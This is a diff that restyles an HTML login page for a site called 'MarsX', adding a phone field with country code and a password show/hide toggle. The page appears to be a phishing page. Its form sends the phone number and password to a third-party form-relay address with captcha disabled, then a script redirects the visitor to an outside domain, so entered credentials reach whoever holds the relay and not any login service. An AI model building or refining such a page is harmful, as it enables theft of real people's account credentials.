@@ -6,7 +6,7 @@
   <title>Login | MarsX</title>
   <style>
     body {
-      background-color: #000; /* Fond noir */
+      background-color: #000;
       font-family: Arial, sans-serif;
       color: white;
       display: flex;
@@ -18,48 +18,42 @@
     }
 
     .container {
-      background-color: transparent; /* Fond transparent pour la zone du formulaire */
-      padding: 30px;
-      border-radius: 15px;
-      width: 100%;
-      max-width: 380px;
-      box-shadow: none; /* Retirer l'ombre pour qu'il n'y ait plus de rectangle gris */
       text-align: center;
+      width: 100%;
+      max-width: 400px;
+      padding: 30px 20px;
     }
 
-    /* Logo aligné à gauche */
     .logo {
-      text-align: left;
-      margin-bottom: 20px;
+      margin-bottom: 10px;
     }
 
     .logo img {
-      height: 40px; /* Taille réduite du logo */
+      height: 60px;
     }
 
     h2 {
+      font-size: 26px;
+      font-weight: bold;
       margin-bottom: 20px;
-      font-weight: 700;
-      font-size: 22px;
-      letter-spacing: 0.5px;
     }
 
     .tabs {
       display: flex;
-      justify-content: space-between;
+      justify-content: center;
       margin-bottom: 20px;
     }
 
     .tab {
-      padding: 10px 20px;
+      flex: 1;
+      padding: 10px 0;
+      font-weight: bold;
+      font-size: 14px;
       border-radius: 25px;
       cursor: pointer;
-      background-color: #333;
+      background-color: #222;
       color: white;
-      width: 120px;
-      font-size: 14px;
-      text-align: center;
-      font-weight: bold;
+      transition: background-color 0.3s;
     }
 
     .tab.active {
@@ -73,25 +67,79 @@
       align-items: stretch;
     }
 
-    label {
-      font-size: 12px;
-      color: white;
-      text-align: left;
-      margin-bottom: 5px;
+    .phone-input {
+      display: flex;
+      align-items: center;
+      background-color: #222;
+      border-radius: 10px;
+      padding: 0 10px;
+      margin-bottom: 20px;
     }
 
-    input {
-      padding: 12px;
+    .phone-input img {
+      width: 20px;
+      margin-right: 8px;
+    }
+
+    .phone-input select,
+    .phone-input input {
+      background: transparent;
+      border: none;
+      color: white;
+      padding: 12px 5px;
+      font-size: 16px;
+      flex: 1;
+      outline: none;
+    }
+
+    .input-wrapper {
+      position: relative;
       margin-bottom: 20px;
+    }
+
+    .input-wrapper input {
+      width: 100%;
+      padding: 12px;
       border-radius: 10px;
       border: none;
       outline: none;
-      background-color: #333; /* Fond noir pour les champs */
+      background-color: #222;
       color: white;
       font-size: 16px;
     }
 
-    /* Bouton "Log In" */
+    .input-wrapper .toggle-password {
+      position: absolute;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #999;
+    }
+
+    .options {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 14px;
+      color: #ccc;
+      margin-bottom: 20px;
+    }
+
+    .options a {
+      color: #d4af37;
+      text-decoration: none;
+    }
+
+    .remember-me {
+      display: flex;
+      align-items: center;
+    }
+
+    .remember-me input {
+      margin-right: 5px;
+    }
+
     button {
       background-color: #d4af37;
       border: none;
@@ -109,30 +157,23 @@
       background-color: #b3922b;
     }
 
-    .options {
-      display: flex;
-      justify-content: space-between;
+    #please-wait {
+      display: none;
+      color: #d4af37;
       font-size: 14px;
-      color: #ccc;
-      margin-bottom: 20px;
+      margin-top: 10px;
     }
 
     .signup {
       font-size: 14px;
       color: #aaa;
+      margin-top: 20px;
     }
 
     .signup a {
       color: #d4af37;
       text-decoration: none;
       font-weight: bold;
-    }
-
-    #please-wait {
-      display: none;
-      color: #d4af37;
-      font-size: 14px;
-      margin-top: 10px;
     }
 
   </style>
@@ -142,7 +183,9 @@
     <div class="logo">
       <img src="https://i.imgur.com/KZsmUi2.png" alt="MarsX Logo" />
     </div>
+
     <h2>Welcome To Login</h2>
+
     <div class="tabs">
       <div class="tab active">Phone Login</div>
       <div class="tab">Email Login</div>
@@ -151,37 +194,54 @@
     <form action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST" onsubmit="return handleSubmit();">
       <input type="hidden" name="_captcha" value="false">
 
-      <!-- Champs avec labels au-dessus -->
-      <label for="phone_number">Phone Number</label>
-      <input type="text" id="phone_number" name="phone_number" placeholder="Phone Number" required />
-
-      <label for="password">Password</label>
-      <input type="password" id="password" name="password" placeholder="Password" required />
-
-      <div class="options">
-        <label><input type="checkbox" name="remember" /> Remember me</label>
-        <a href="#" style="color: #d4af37;">Forgot password?</a>
+      <!-- Phone number with flag and code -->
+      <label style="text-align: left; font-size: 12px; margin-bottom: 5px;">Phone Number</label>
+      <div class="phone-input">
+        <img src="https://flagcdn.com/us.svg" alt="US Flag">
+        <select name="country_code" style="width: 50px;">
+          <option value="+1">+1</option>
+        </select>
+        <input type="text" name="phone_number" placeholder="Phone Number" required />
       </div>
 
+      <!-- Password -->
+      <label style="text-align: left; font-size: 12px; margin-bottom: 5px;">Password</label>
+      <div class="input-wrapper">
+        <input type="password" id="password" name="password" placeholder="Password" required />
+        <span class="toggle-password" onclick="togglePassword()">👁️</span>
+      </div>
+
+      <!-- Options -->
+      <div class="options">
+        <a href="#">Forgot password?</a>
+        <label class="remember-me">
+          <input type="checkbox" name="remember" />
+          Remember account and password
+        </label>
+      </div>
+
+      <!-- Submit -->
       <button type="submit">Log In</button>
       <div id="please-wait">Please wait...</div>
     </form>
 
     <div class="signup">
-      Continue is agree <a href="#">Sign Up</a>
+      Continue Is Agree <a href="#">Sign Up</a>
     </div>
   </div>
 
   <script>
     function handleSubmit() {
       document.getElementById("please-wait").style.display = "block";
-      
-      // Attendre 1 seconde avant de rediriger
       setTimeout(() => {
         window.location.href = "https://masx45.com/";
       }, 1000);
+      return true;
+    }
 
-      return true; // Permet au formulaire d’être soumis
+    function togglePassword() {
+      const pwd = document.getElementById("password");
+      pwd.type = pwd.type === "password" ? "text" : "password";
     }
   </script>
 </body>
